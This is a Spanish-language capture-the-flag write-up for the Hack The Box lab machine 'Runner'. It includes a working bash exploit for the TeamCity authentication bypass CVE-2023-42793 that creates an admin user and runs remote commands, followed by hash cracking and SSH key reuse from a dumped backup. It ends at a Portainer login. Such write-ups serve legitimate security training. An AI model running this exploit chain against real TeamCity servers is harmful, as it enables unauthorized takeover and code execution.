# Runner

![Pasted image 20240506165450](https://github.com/JoseVazquez101/Writteups/assets/111292579/bf8f6704-1682-42c5-829c-165bb4962720)

***
 - Source: https://app.hackthebox.com/machines/Runner
- OS: ``Linux``.
- Dificultad: ``Medium``.
- IP: ``10.10.11.13``.
- Temas: `CVE-2023-42793`, `Portainer`, `c`, `d`.
***


- Realizamos un escaneo de puertos con `nmap`:

~~~bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.11.13
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 18:32 EDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 18:32
Scanning 10.10.11.13 [65535 ports]
Discovered open port 22/tcp on 10.10.11.13
Discovered open port 80/tcp on 10.10.11.13
Discovered open port 8000/tcp on 10.10.11.13
Completed SYN Stealth Scan at 18:33, 22.33s elapsed (65535 total ports)
Initiating Service scan at 18:33
Scanning 3 services on 10.10.11.13
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 18:33, 6.98s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.13.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:33
Completed NSE at 18:33, 1.25s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:33
Completed NSE at 18:33, 0.89s elapsed
Nmap scan report for 10.10.11.13
Host is up, received user-set (0.22s latency).
Scanned at 2024-05-06 18:32:51 EDT for 31s
Not shown: 65037 closed tcp ports (reset), 495 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.72 seconds
           Raw packets sent: 108801 (4.787MB) | Rcvd: 89232 (3.569MB)
~~~

- Podemos ver tres servicios:
	- `ssh`: 22
	- `http`: 80
	- `Nagios`: 8000

- Hice un fuzzeo de directorios en el puerto 80, pero no encontré nada, lo único que vi fueron algunos directorios en el servicio de `Nagios`, pero revisandolos no tenían nada relevante:

~~~bash
❯ ffuf -c -u 'http://runner.htb:8000/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404,401
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,401
________________________________________________

version                 [Status: 200, Size: 9, Words: 1, Lines: 1, Duration: 215ms]
health                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 218ms]
~~~

- El directorio `health` solo me regresaba un mensaje `ok`, y el de `version` me regresaba un mensaje, `0.0.0-src` pero esto no nos dice nada en realidad.

- También vi que más había en las tecnologías de la página, tenemos algo que nos dice que la página está usando algo llamado `TeamCity`:

~~~bash
❯ whatweb http://runner.htb -v
WhatWeb report for http://runner.htb
Status    : 200 OK
Title     : Runner - CI/CD Specialists
IP        : 10.10.11.13
Country   : RESERVED, ZZ

Summary   : Bootstrap, Email[sales@runner.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], JQuery[3.5.1], nginx[1.18.0], PoweredBy[TeamCity!], Script, X-UA-Compatible[IE=edge]
~~~

- Aquí enumeré a muerte con todas las wordlist posibles porque no había nada, pero pude encontrar una donde me arrojó un resultado positivo:

~~~bash
❯ gobuster vhost -u http://runner.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -t 50 --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://runner.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: teamcity.runner.htb Status: 401 [Size: 66]
~~~

- Añadí el subdominio al `/etc/hosts`.
- En el subdominio hay un login:

![Pasted image 20240506183418](https://github.com/JoseVazquez101/Writteups/assets/111292579/aa6e4899-b79b-49e1-8427-a3ea9c574e45)

- Según la página, tenemos una versión `2023.05.3 (build 129390)`.
- Buscando exploits de la versión, pude encontrar una RCE para ``JetBrains TeamCity``.
- Esta es una `bypass authentication` identificada como ``CVE-2023-42793``.
- Aquí hay un exploit que explica bastante bien el funcionamiento:
	- https://github.com/H454NSec/CVE-2023-42793

- Lo que hace es que elimina el token de autenticación del usuario admin con una petición de header `DELETE`, una vez hecho esto, hace una petición post al mismo endpoint, por lo que el servidor responde dandonos un nuevo token de administrador, y con este podemos generar un nuevo usuario.
- Apoyándome en esto, creé una versión del exploit en bash que hace lo descrito anteriormente a través de peticiones con `curl`:

~~~bash
#!/bin/bash

main_url=""
user=""
passwd=""

# Parse command line options
while getopts ":h:u:p:" opt; do
  case ${opt} in
    h ) main_url=$OPTARG ;;
    u ) user=$OPTARG ;;
    p ) passwd=$OPTARG ;;
    \? ) echo "Usage: $0 [-h url] [-u user] [-p passwd]"
         exit 1 ;;
  esac
done

# Check if all parameters are provided
if [[ -z "$main_url" || -z "$user" || -z "$passwd" ]]; then
  echo "All parameters --user, --passwd and --url must be provided."
  echo "Usage: $0 -h url -u user -p passwd"
  exit 1
fi

#Delete token
curl -X DELETE "${main_url}/app/rest/users/id:1/tokens/RPC2" -H "Content-Type: application/x-www-form-urlencoded"
sleep 1

#Generate new token because the server doesnt find any other
token=$(curl -s -X POST "${main_url}/app/rest/users/id:1/tokens/RPC2" | grep -oP 'value="\K[^"]+')
echo -ne "\n[+] Generated tokne: $token"
sleep 1

user_generated=$(curl -s -X POST "${main_url}/app/rest/users" -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" -d "{\"email\": \"\", \"username\": \"${user}\", \"password\": \"${passwd}\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}")

if [[ "$user_generated" == *"username already exists"* ]]; then
  echo -ne "\n[!] This user already exist"
else
  echo -ne "\n[+] The credentials ${user}:${passwd} has been created!"
fi
~~~

- Y generamos un nuevo usuario:

~~~bash
❯ ./CVE.sh -h http://teamcity.runner.htb -u retr0 -p pass123
[+] Generated tokne: eyJ0eXAiOiAiVENWMiJ9.b3U0cUZhTVdrU0V0S1FEUXFzeVl2Yl9OaHlj.YTM0NDFhY2EtYmYzOC00MTg3LWI5MDYtN2IxOTliY2U3NmE4
[+] The credentials retr0:pass123 has been created!
~~~

- Investigué un poco y descubrí que esta misma vulnerabilidad reporta una RCE modificando el valor de un archivo de configuración a `true`, el cual nos deja debuguear con comandos.
- En sí esto nos dejará derivar a una `RCE` ejecutando un comando al server, estas fueron las dos peticiones que usé:

~~~bash
❯ curl -s -X POST "http://teamcity.runner.htb/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.a01DNXNvZWpFaGdqZmRoZDE0Y1J2N0p6THYw.YmY3ZGI0M2ItNDI4NC00OGExLWIxOTQtYTVlMmUwMTYxNWJi" -H "Content-Type: text/plain"

❯ curl -s -X POST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=id" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.a01DNXNvZWpFaGdqZmRoZDE0Y1J2N0p6THYw.YmY3ZGI0M2ItNDI4NC00OGExLWIxOTQtYTVlMmUwMTYxNWJi" -H "Content-Type: text/plain"
StdOut:uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)

StdErr: 
Exit code: 0
Time: 19ms     
~~~

- Agregué estos a mi script:

~~~bash
#!/bin/bash

main_url=""
user=""
passwd=""
cmd=""

# Parse command line options
while getopts ":h:u:p:c:" opt; do
  case ${opt} in
    h ) main_url=$OPTARG ;;
    u ) user=$OPTARG ;;
    p ) passwd=$OPTARG ;;
    c ) cmd=$OPTARG ;;
    \? ) echo "Usage: $0 [-h url] [-u user] [-p passwd] [-c command]"
         exit 1 ;;
  esac
done

# Check if all parameters are provided
if [[ -z "$main_url" || -z "$user" || -z "$passwd" || -z "$cmd" ]]; then
  echo "All parameters --user, --passwd, --url and --cmd must be provided."
  echo "Usage: $0 -h url -u user -p passwd -c command"
  exit 1
fi

#Delete token
curl -X DELETE "${main_url}/app/rest/users/id:1/tokens/RPC2" -H "Content-Type: application/x-www-form-urlencoded"
sleep 1

#Generate new token because the server doesnt find any other
token=$(curl -s -X POST "${main_url}/app/rest/users/id:1/tokens/RPC2" | grep -oP 'value="\K[^"]+')

echo -ne "\n[+] Generated tokne: $token"
sleep 1

user_generated=$(curl -s -X POST "${main_url}/app/rest/users" -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" -d "{\"email\": \"\", \"username\": \"${user}\", \"password\": \"${passwd}\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}")

if [[ "$user_generated" == *"username already exists"* ]]; then
  echo -ne "\n[!] This user already exist"
else
  echo -ne "\n[+] The credentials ${user}:${passwd} has been created!"
fi

# Edit config file
curl -s -X POST "${main_url}/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer ${token}" -H "Content-Type: text/plain"

# RCE
echo -ne "\n[+] Iniciating RCE whit command: ${cmd}\n"
curl -s -X POST "${main_url}/app/rest/debug/processes?exePath=${cmd}" -H "Authorization: Bearer ${token}" -H "Content-Type: text/plain"
~~~

- Esto no sirvió de nada, porque encodeé de todas formas posibles una revshell pero no me dejaba ejecutar comandos con espacios, quizá es posible pero no llegué a intentarlo.

- Decidí enumerar más el panel de administración, y encontré un apartado de backups, creamos uno y lo descargamos.
- Podemos llegar a esta a través de `Administration > Backup`:

![Pasted image 20240507183102](https://github.com/JoseVazquez101/Writteups/assets/111292579/7223af03-f063-452c-8443-98e44cf1e104)

- Descomprimí el respaldo y revisé la carpeta de `Database Dump`.
- Aquí encontré un archivo con hashes llamado `users`:

~~~bash
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1715123053025, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, retr0, $2a$07$wwyONJnBFXK//3ByHYsYKOC1kSFNR1PopfqKYgSgPZLzIqnwq1lGy, , "", 1715121761707, BCRYPT
12, fak3admin, $2a$07$8VkLzcThnf9nrO5Sq977OO/8CgPZ0fMreu6TVd37PpK.gXkN9Uahm, , "", , BCRYPT
~~~

- Las rompí con `john`:

~~~bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
piper123         (matthew)     
1g 0:00:03:15 1.19% (ETA: 00:02:19) 0.005108g/s 1030p/s 1296c/s 1296C/s gen123..gator8
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
~~~

- Esto no sirvió para nada, porque no podemos acceder como `matthew`.
- Encontré también una llave privada de `ssh` en las backups, esto lo hice haciendo un ``tree`` en todas las carpetas y viendo los archivos:

~~~bash
❯ find ./ -name id_rsa 2>/dev/null
./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
❯ cd config/projects/AllProjects/pluginData/ssh_keys
❯ ls
 id_rsa
~~~

- Le asigné permisos adecuados a la llave:

~~~bash
❯ chmod 600 id_rsa
~~~

- Intenté loguearme con los dos usuarios, pero solo funcionó con `john`:

~~~bash
❯ ssh john@runner.htb -i id_rsa
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

<--------- TRASH --------->

Last login: Tue May  7 23:44:14 2024 from 10.10.14.90
john@runner:~$ 
~~~

***
### PrivEsc:

- Enumerando un poco más con linpeas nos arroja varias carpetas que hacen sospechar que hay un `portainer`.

~~~bash
john@runner:~$ ls /opt/
containerd  portainer
~~~

- Portainer es una GUI para gestionar dockers, así que si logramos acceder quizá podamos desplegar un docker vulnerable.

- En el `/etc/hosts` podemos ver otro dominio:

~~~bash
john@runner:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb
~~~

- Añadimos este subdominio a nuestro `/etc/hosts` y si lo visitamos podemos ver esto:

![Pasted image 20240507185658](https://github.com/JoseVazquez101/Writteups/assets/111292579/61e55705-eb94-4ff5-8bf0-6c22aa20bfce)

- Si usamos las credenciales de `Matthew` que habíamos obtenido previamente      (`matthew:piper123`), podremos entrar:

![Pasted image 20240507191422](https://github.com/JoseVazquez101/Writteups/assets/111292579/b5c9c3a7-9e58-4918-a34c-0cb78065a280)

